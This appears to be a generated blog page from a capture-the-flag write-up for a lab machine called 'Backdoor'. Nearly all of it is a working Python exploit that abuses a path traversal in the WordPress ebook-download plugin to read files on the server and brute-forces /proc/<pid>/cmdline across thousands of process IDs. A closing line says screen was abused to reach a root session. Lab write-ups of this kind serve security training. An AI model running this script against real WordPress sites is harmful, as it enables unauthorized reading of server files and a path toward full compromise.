@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/backdoor.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/backdoor.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/backdoor.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="backdoor">Backdoor</h1>
+
+<p>Script used to gain a foothold on the machine.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">signal</span>
+<span class="kn">from</span> <span class="n">concurrent</span> <span class="kn">import</span> <span class="n">futures</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Exiting...</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">handler</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../..{}</span><span class="sh">'</span>
+
+<span class="sh">'''</span><span class="s">
+Bruteforce /proc/&lt;pid&gt;/cmdline
+</span><span class="sh">'''</span>
+
+<span class="k">def</span> <span class="nf">bruteforce_cmdline_thread</span><span class="p">(</span><span class="n">final_url</span><span class="p">,</span><span class="n">prefix</span><span class="p">,</span><span class="n">sufix</span><span class="p">,</span><span class="n">pid</span><span class="p">):</span>
+    
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">final_url</span><span class="p">)</span>
+        <span class="n">cmdline</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">removeprefix</span><span class="p">(</span><span class="n">prefix</span><span class="p">).</span><span class="nf">removesuffix</span><span class="p">(</span><span class="n">sufix</span><span class="p">)</span>
+        <span class="nf">if </span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">cmdline</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">):</span>
+            
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Proceso con p id -&gt; %s encontrado</span><span class="sh">'</span> <span class="o">%</span> <span class="n">pid</span> <span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] cmdline -&gt; %s</span><span class="se">\n</span><span class="sh">'</span> <span class="o">%</span> <span class="n">cmdline</span><span class="p">)</span>
+            
+<span class="k">def</span> <span class="nf">bruteforce_cmdline</span><span class="p">():</span>
+
+    <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+    
+    <span class="k">with</span> <span class="n">futures</span><span class="p">.</span><span class="nc">ThreadPoolExecutor</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">pid</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">20000</span><span class="p">):</span>
+            
+            <span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/proc/{}/cmdline</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
+            <span class="n">prefix</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">../../../../../../..</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">../../../../../../..</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">../../../../../../..</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">'</span>
+            <span class="n">sufix</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;script&gt;window.close()&lt;/script&gt;</span><span class="sh">'</span>
+            
+            <span class="n">final_url</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+            <span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sh">'</span><span class="s">Probando con %s</span><span class="sh">'</span> <span class="o">%</span> <span class="n">final_url</span><span class="p">)</span>
+            <span class="n">executor</span><span class="p">.</span><span class="nf">submit</span><span class="p">(</span><span class="n">bruteforce_cmdline_thread</span><span class="p">,</span><span class="n">final_url</span><span class="p">,</span><span class="n">prefix</span><span class="p">,</span><span class="n">sufix</span><span class="p">,</span><span class="n">pid</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Then we abused  <code class="language-plaintext highlighter-rouge">screen</code> to attach to a root session.</p>
+
+      </section>
+    </div>
+  </body>
+</html>
